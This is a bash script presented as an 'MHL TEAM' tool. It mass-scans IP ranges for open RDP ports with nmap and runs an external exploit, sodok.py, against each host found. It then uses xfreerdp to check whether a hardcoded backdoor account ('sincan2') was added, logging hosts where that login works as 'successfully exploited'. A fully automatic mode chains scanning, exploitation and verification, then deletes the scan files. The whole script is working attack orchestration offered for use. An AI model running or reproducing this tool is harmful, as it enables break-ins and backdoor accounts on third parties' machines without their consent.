#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

TARGET_LIST_FILE="success.txt"
FULL_SCAN_REPORT="scan_complete.txt"
SUCCESS_FILE="cok.txt"

check_deps() {
    if ! command -v python3 &> /dev/null; then echo -e "${RED}‚ùå Error: 'python3' not found.${NC}"; exit 1; fi
    if ! command -v nmap &> /dev/null; then echo -e "${RED}‚ùå Error: 'nmap' not found.${NC}"; exit 1; fi
    if ! command -v xfreerdp &> /dev/null; then echo -e "${RED}‚ùå Error: 'xfreerdp' not found.${NC}\n${YELLOW}‚ÑπÔ∏è  Install: sudo apt install freerdp2-x11 -y${NC}"; exit 1; fi
    if [ ! -f "sodok.py" ]; then echo -e "${RED}‚ùå Error: File 'sodok.py' not found.${NC}"; exit 1; fi
}

_internal_scan() {
    local IP_RANGE=$1
    local ports="3389,3390,3391,13389,12345"
    local temp_gnmap_file="temp_scan.gnmap"

    echo -e "\n${YELLOW}üì° Start scan on range ${IP_RANGE}...${NC}"
    echo -e "${YELLOW}   Port scan: ${ports}${NC}"
    echo -e "${YELLOW}   This will take a while, please be patient....${NC}"
    echo -e "${BLUE}----------------------[ NMAP OUTPUT ]----------------------${NC}"

    nmap -p "$ports" --script rdp-ntlm-info -sV -Pn -oN "$FULL_SCAN_REPORT" -oG "$temp_gnmap_file" "$IP_RANGE"

    echo -e "${BLUE}--------------------[ NMAP FINISHED ]---------------------${NC}"

    awk '/\/open\// {ip=$2; for(i=3; i<=NF; i++) if($i ~ /open/) {split($i, p, "/"); print ip":"p[1]}}' "$temp_gnmap_file" > "$TARGET_LIST_FILE"
    rm "$temp_gnmap_file"
}

# modify creds
verify_credentials() {
    local IP=$1; local PORT=$2; local USER="sincan2"; local PASS="koped123"; echo -e "${CYAN}[*] Trying to verify credentials on ${IP}:${PORT}...${NC}"; xfreerdp /v:"${IP}:${PORT}" /u:"${USER}" /p:"${PASS}" +auth-only /cert:ignore /timeout:15000 > /dev/null 2>&1; if [ $? -eq 0 ]; then echo -e "${GREEN}[+] VERIFICATION SUCCESSFUL! User '${USER}' dapat login.${NC}"; echo "SUCCESS: ${IP}:${PORT} - User: ${USER} Pass: ${PASS}" >> "${SUCCESS_FILE}"; echo -e "${GREEN}[+] Results are saved in ${SUCCESS_FILE}${NC}"; else echo -e "${RED}[-] Verification Failed. User '${USER}' can't login or target is not responding.${NC}"; fi
}

# Attack function with 'auto' mode for verification
attack_and_verify() {
    local IP=$1
    local PORT=$2
    local MODE=$3

    echo -e "\n${YELLOW}üöÄ Initiating an attack on ${IP}:${PORT}...${NC}"
    python3 sodok.py "$IP" "$PORT"

    echo -e "\n${BLUE}[*] Wait 10 seconds for the payload to be executed target...${NC}"
    sleep 10

    if [[ "$MODE" == "auto" ]]; then
        verify_credentials "$IP" "$PORT"
    else
        read -p "Try to verify adding user now? (y/n): " choice
        if [[ "$choice" == "y" || "$choice" == "Y" ]]; then
            verify_credentials "$IP" "$PORT"
        fi
    fi
}

single_attack() {
    echo -e "${CYAN}--- Attack Single Target ---${NC}"; read -p "Enter IP Target: " RHOST; read -p "Enter Port RDP Target (default: 3389): " RPORT; RPORT=${RPORT:-3389}; if [ -z "$RHOST" ]; then echo -e "${RED}IP Target cannot be empty!${NC}"; sleep 2; return; fi; attack_and_verify "$RHOST" "$RPORT"; echo -e "\n${GREEN}‚úÖ Process complete. Press [Enter] to return to the menu.${NC}"; read -r
}

mass_attack() {
    echo -e "${CYAN}--- Mass Attack from ${TARGET_LIST_FILE} ---${NC}"; if [ ! -s "$TARGET_LIST_FILE" ]; then echo -e "${RED}‚ùå File ${TARGET_LIST_FILE} empty or non-existent.${NC}"; sleep 3; return; fi; echo -e "${YELLOW}üìÑ List of targets to be attacked(Format IP:PORT):${NC}"; cat -n "$TARGET_LIST_FILE"; echo ""; total=$(wc -l < "$TARGET_LIST_FILE"); current=1; while IFS= read -r line; do IP=$(echo "$line" | cut -d':' -f1); PORT=$(echo "$line" | cut -d':' -f2); echo -e "${BLUE}--------------------------------------------------${NC}"; attack_and_verify "$IP" "$PORT"; current=$((current + 1)); done < "$TARGET_LIST_FILE"; echo -e "\n${GREEN}‚úÖ All targets have been processed.${NC}"; read -p "Do you want to deletefile '$TARGET_LIST_FILE' dan '$FULL_SCAN_REPORT'? (y/n): " confirm; if [[ "$confirm" == "y" || "$confirm" == "Y" ]]; then > "$TARGET_LIST_FILE"; > "$FULL_SCAN_REPORT"; echo -e "${GREEN}File scan results have been deleted.${NC}"; fi; echo -e "Press [Enter] to return to the menu."; read -r
}

scan_rdp() {
    echo -e "${CYAN}--- Scan RDP Advanced ---${NC}"; read -p "Enter range IP to scan (contoh: 192.168.1.0/24): " IP_RANGE; if [ -z "$IP_RANGE" ]; then echo -e "${RED}Range IP cannot be empty!${NC}"; sleep 2; return; fi; _internal_scan "$IP_RANGE"; echo -e "\n${GREEN}‚úÖ Scan finished!${NC}"; echo -e "   - Report complete with OS/version details stored in: ${CYAN}${FULL_SCAN_REPORT}${NC}"; if [ -s "$TARGET_LIST_FILE" ]; then echo -e "   - A list of clean targets to attack is stored in: ${CYAN}${TARGET_LIST_FILE}${NC}"; echo -e "${BLUE}-------------------- TARGET FOUND (IP:PORT) --------------------${NC}"; cat "$TARGET_LIST_FILE"; echo -e "${BLUE}--------------------------------------------------------------------${NC}"; else echo -e "\n${RED}‚ùå No hosts with open RDP ports FOUND.${NC}"; fi; echo -e "Press [Enter] to return."; read -r
}

full_auto_mode() {
    echo -e "${CYAN}--- üî• Mode Fully Automatic: Scan, Attack, Verify üî• ---${NC}"; read -p "Enter range IP to scan (contoh: 192.168.1.0/24): " IP_RANGE; if [ -z "$IP_RANGE" ]; then echo -e "${RED}Range IP cannot be empty!${NC}"; sleep 2; return; fi; _internal_scan "$IP_RANGE"; if [ ! -s "$TARGET_LIST_FILE" ]; then echo -e "\n${RED}‚ùå No targets FOUND after scan. Process automatically stops..${NC}"; rm -f "$FULL_SCAN_REPORT"; echo -e "Press [Enter] to return to the menu."; read -r; return; fi; echo -e "\n${GREEN}‚úÖ Scan finished. FOUND $(wc -l < ${TARGET_LIST_FILE}) target. Initiate auto attack phase...${NC}"; while IFS= read -r line; do IP=$(echo "$line" | cut -d':' -f1); PORT=$(echo "$line" | cut -d':' -f2); echo -e "${BLUE}=====================================================================${NC}"; attack_and_verify "$IP" "$PORT" "auto"; done < "$TARGET_LIST_FILE"; echo -e "\n${GREEN}‚úÖ Automatic process finished for all targets.${NC}"; echo -e "[*] Deleting temporary files (${TARGET_LIST_FILE} dan ${FULL_SCAN_REPORT})..."; rm -f "$TARGET_LIST_FILE" "$FULL_SCAN_REPORT"; echo -e "[*] Scan finished. Check file ${CYAN}${SUCCESS_FILE}${NC} to see a list of successfully exploited targets."; echo -e "Press [Enter] to return to the menu."; read -r
}

main_menu() {
    clear; echo -e "${YELLOW}"; cat << "BANNER_ART"
|  \      /  \|  \  |  \|  \          |      \|         \ /         \ |  \      /  \
| $$\    /  $$| $$  | $$| $$           \$$$$$$$$| $$$$$$$$|  $$$$$$\| $$\    /  $$
| $$$\  /  $$$| $$__| $$| $$                 | $$  | $$__    | $$__| $$| $$$\  /  $$$
| $$$$\  $$$$| $$    $$| $$                 | $$  | $$  \   | $$    $$| $$$$\  $$$$
| $$\$$ $$ $$| $$$$$$$$| $$                 | $$  | $$$$$   | $$$$$$$$| $$\$$ $$ $$
| $$ \$$$| $$| $$  | $$| $$_____          | $$  | $$_____ | $$  | $$| $$ \$$$| $$
| $$  \$ | $$| $$  | $$| $$      \          | $$  | $$      \| $$  | $$| $$  \$ | $$
 \$$      \$$ \$$   \$$ \$$$$$$$$          \$$   \$$$$$$$$ \$$   \$$ \$$      \$$
BANNER_ART
    echo -e "${NC}"; echo -e "${BLUE}=========================================================================================${NC}"; echo -e "${CYAN}                                  -=[ M H L  T E A M ]=-                                    ${NC}"; echo -e "${BLUE}=========================================================================================${NC}"; printf "| %-85s |\n" ""; printf "|  ${GREEN}%-83s${BLUE}  |\n" "Select Options:"; printf "| %-85s |\n" ""; printf "|    ${YELLOW}%s)${NC} %s %-78s${BLUE}|\n" "1" "üéØ" "Attack Target Single (IP:Port)"; printf "|    ${YELLOW}%s)${NC} %s %-78s${BLUE}|\n" "2" "üìã" "Attack Bulk (from ${TARGET_LIST_FILE})"; printf "|    ${YELLOW}%s)${NC} %s %-78s${BLUE}|\n" "3" "üîç" "Scan RDP Advanced & Save Results"; printf "|    ${RED}%s)${NC} %s %-78s${BLUE}|\n" "4" "üî•" "Scan & Attack Automatic (Full Auto)"; printf "| %-85s |\n" ""; printf "|    ${RED}%s)${NC} %s %-78s${BLUE}|\n" "0" "üö™" "Keluar"; printf "| %-85s |\n" ""; echo -e "${BLUE}=========================================================================================${NC}"
}

check_deps
while true; do
    main_menu
    read -p "Select from - [0-4]: " choice
    case $choice in
        1) single_attack ;;
        2) mass_attack ;;
        3) scan_rdp ;;
        4) full_auto_mode ;;
        0) echo -e "\n${CYAN}Thank You! üëã${NC}"; exit 0 ;;
        *) echo -e "\n${RED}‚ùå Selection isn't valid!${NC}"; sleep 1 ;;
    esac
done
